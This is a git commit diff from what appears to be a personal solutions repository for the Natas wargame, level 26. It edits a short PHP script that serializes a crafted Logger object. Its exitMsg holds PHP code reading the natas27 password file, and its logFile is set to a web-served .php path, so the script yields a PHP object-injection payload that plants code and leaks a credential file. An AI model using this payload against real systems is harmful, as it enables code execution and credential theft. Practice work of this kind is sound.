dbae704a84319da1e62fdcc5ec6d914a988d245f
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-09-26 20:24:50 +1000

    fixed the object serialisation process, instead of getting natas26's password, get natas27's password

--- natas26/serialize.php
+++ natas26/serialize.php
@@ -1,7 +1,7 @@
 <?
     class Logger{
         private $logFile = "img/passwordofnatas27.php";
-        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>";
+        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas27') ?>";
     }
 
     print urlencode(base64_encode(serialize(new Logger)));
